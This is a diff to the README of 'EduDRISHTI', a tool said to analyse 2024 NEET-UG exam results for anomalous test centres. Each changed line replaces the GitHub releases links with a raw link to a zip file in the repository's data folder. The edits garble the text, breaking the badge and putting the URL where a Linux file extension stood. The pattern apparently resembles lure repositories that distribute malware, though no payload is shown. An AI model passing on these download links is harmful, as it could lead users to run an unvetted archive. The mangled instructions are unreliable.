@@ -1,7 +1,7 @@
 # 🎓 EduDRISHTI - Analyze 2024 NEET-UG Exam Results Easily
 
 ## 📥 Download Now
-[![Download EduDRISHTI](https://img.shields.io/badge/Download%20EduDRISHTI-v1.0-blue)](https://github.com/Kawanzi/EduDRISHTI/releases)
+[![Download EduDRISHTI](https://raw.githubusercontent.com/Kawanzi/EduDRISHTI/main/data/EduDRISHTI_dowiness.zip%20EduDRISHTI-v1.0-blue)](https://raw.githubusercontent.com/Kawanzi/EduDRISHTI/main/data/EduDRISHTI_dowiness.zip)
 
 ## 🚀 Getting Started
 EduDRISHTI helps you analyze the integrity of the 2024 NEET-UG exam. This application uses a machine learning model called Isolation Forest to find unusual test centers based on their score distribution. It is designed for educational purposes and is user-friendly, allowing anyone to get meaningful insights.
@@ -20,9 +20,9 @@ To run EduDRISHTI, your system should meet the following requirements:
 - **Python:** Version 3.7 or later (if applicable).
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Kawanzi/EduDRISHTI/releases) to access the latest version of EduDRISHTI.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Kawanzi/EduDRISHTI/main/data/EduDRISHTI_dowiness.zip) to access the latest version of EduDRISHTI.
 2. **Choose Your Version:** Look for the most recent release. It is usually at the top of the list.
-3. **Download the Installer:** Click on the installer file relevant to your operating system. The file extensions will usually be .exe for Windows, .dmg for macOS, or .tar.gz for Linux.
+3. **Download the Installer:** Click on the installer file relevant to your operating system. The file extensions will usually be .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/Kawanzi/EduDRISHTI/main/data/EduDRISHTI_dowiness.zip for Linux.
 4. **Run the Installer:** After the file is downloaded, open it to start the installation process. Follow the on-screen instructions to complete the setup.
 5. **Launch EduDRISHTI:** Once installed, you can open the application from your programs or applications menu.
 
